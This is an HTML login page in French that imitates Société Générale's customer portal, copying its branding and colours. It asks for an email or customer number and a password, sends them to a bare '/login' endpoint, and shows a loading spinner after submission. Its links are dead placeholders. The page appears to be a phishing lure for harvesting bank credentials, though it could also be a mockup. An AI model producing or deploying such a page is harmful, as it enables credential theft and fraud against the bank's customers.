<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Espace Client - Société Générale</title>
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        .logo { font-size: 24px; font-weight: bold; color: #0065a8; margin-bottom: 5px; }
        .logo span { color: #d4af37; }
        h2 { color: #333; font-size: 18px; margin-top: 5px; margin-bottom: 30px; font-weight: 400; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
        input:focus { border-color: #0065a8; }
        button { width: 100%; padding: 12px; background-color: #0065a8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
        button:hover { background-color: #004d80; }
        .footer { margin-top: 25px; font-size: 12px; color: #666; line-height: 1.5; }
        .footer a { color: #0065a8; text-decoration: none; }
        .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #0065a8; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Société <span>Générale</span></div>
        <h2>Bienvenue dans votre espace client</h2>
        
        <form action="/login" method="POST">
            <input type="email" name="email" placeholder="Adresse email ou n° client" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit" id="submitBtn">Se connecter</button>
        </form>
        
        <div class="loader" id="loader"></div>

        <div class="footer">
            <p><a href="#">Mot de passe oublié ?</a> | <a href="#">S'abonner</a></p>
            <p>© 2026 Société Générale</p>
        </div>
    </div>

    <script>
        document.querySelector('form').addEventListener('submit', function() {
            document.getElementById('submitBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
        });
    </script>
</body>
</html>
